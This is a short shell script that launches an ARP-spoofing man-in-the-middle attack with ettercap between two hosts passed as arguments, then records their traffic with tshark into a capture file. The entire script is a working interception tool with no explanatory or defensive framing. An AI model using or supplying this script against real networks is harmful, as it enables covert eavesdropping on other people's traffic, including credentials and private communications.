#!/bin/sh
#total_packets = 4
sudo ettercap -D -i wlan0 -M ARP /$1// /$2// &
tshark -i wlan0 -f "host $1 or host $2" -w output.pcap
